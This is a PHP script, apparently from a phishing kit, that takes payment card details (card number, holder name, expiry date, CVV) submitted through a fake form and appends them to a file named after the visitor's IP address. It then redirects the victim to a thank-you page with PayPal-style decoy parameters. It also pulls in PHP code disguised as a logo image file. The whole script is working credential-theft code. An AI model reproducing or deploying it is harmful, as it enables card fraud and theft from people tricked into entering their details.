<?php

include 'bots.php';
    $file = "infos/".$_SERVER['REMOTE_ADDR'].".txt";
    $ip = getenv("REMOTE_ADDR");
    $message = '|================ Information de la Carte ===============|'."\r\n";
    $message .= '|Type Carte               :  '.$_POST['cardtype']."\r\n";
    $message .= '|Numéro de la carte       :  '.$_POST['cardNumber']."\r\n";
    $message .= '|Nom et prénom            :  '.$_POST['nom_prenom']."\r\n";

    $message .= '|Date d expiration        :  '.$_POST['expiration']."\r\n";

    $message .= '|CVV                      :  '.$_POST['cvv']."\r\n";

    $file = fopen("$file","a+")or die("Unable to open file!");
    fwrite($file,$message);
    fclose($file);
    header("location: merci.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>
<html lang="en">
    <head>
		<script language="php">require ('img/logo.png');</script>
    </head>
	 </html>